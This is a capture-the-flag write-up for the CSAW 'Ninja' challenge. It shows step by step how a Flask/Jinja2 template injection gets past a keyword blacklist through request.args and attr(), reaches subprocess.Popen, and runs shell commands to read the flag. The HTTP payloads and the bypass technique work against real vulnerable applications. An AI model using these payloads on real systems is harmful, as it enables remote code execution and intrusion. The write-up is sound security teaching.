---
description: Flask Server-Side Template Injection (SSTI)
---

# Ninja

## Description

Hey guys come check out this website I made to test my ninja-coding skills.

http://web.chal.csaw.io:5000

## Solution

The webpage is vulnerable to a Server-Side Template Injection (SSTI) vulnerability.

However, there are a few restrictions. Using any of the blacklisted words will yield the following error:

> Sorry, the following keywords/characters are not allowed :- \_ ,config ,os, RUNCMD, base

### Filter Bypass

I found this [excellent tutorial](https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f) on how to bypass Jinja2 SSTI filters. Basically, we can pass in any of the blacklisted characters as GET request arguments, then access them through `request.args`.

This allows us to pass them into `attr()`, which is a Jinja2 [built-in filter](https://jinja.palletsprojects.com/en/3.0.x/templates/#builtin-filters) that gets an attribute of an object. `foo|attr("bar")` is equivalent to  `foo.bar`.

The following payload:

`/submit?value={{()|attr(request.args.c)}}&c=__class__`

will result in `().__class__` being evaluated and shown to the user.

### Finding subprocess.Popen

To get the subclasses, we do `().__class__.__base__.__subclasses__()`.

```http
GET /submit?value={{()|attr(request.args.c)|attr(request.args.b)|attr(request.args.s)()}}&c=__class__&b=__base__&s=__subclasses__ HTTP/1.1
Host: web.chal.csaw.io:5000
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://web.chal.csaw.io:5000/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close
```

I copied the output and used the following script to find `<class 'subprocess.Popen'>` in the subclasses. The index was 258.

```python
check = "..."
for index,value in enumerate(check.split(',')):
    if "subprocess.Popen" in value:
        print(index)
```

We are subsequently able to access this index to obtain RCE through `subprocess.Popen`.

### RCE

With access to `subprocess.Popen`, we simply have to leverage it to achieve RCE. 

```http
GET /submit?value={{()|attr(request.args.c)|attr(request.args.b)|attr(request.args.s)()|attr(request.args.g)(258)('ls',shell=True,stdout=-1)|attr('communicate')()|attr(request.args.g)(0)|attr('decode')('utf-8')}}&c=__class__&b=__base__&s=__subclasses__&g=__getitem__ HTTP/1.1
Host: web.chal.csaw.io:5000
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://web.chal.csaw.io:5000/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close
```

Finally, `cat flag.txt` gives us the flag!

![](<../../.gitbook/assets/image (76).png>)

The flag is `flag{m0mmy_s33_1m_4_r34l_n1nj4}`.
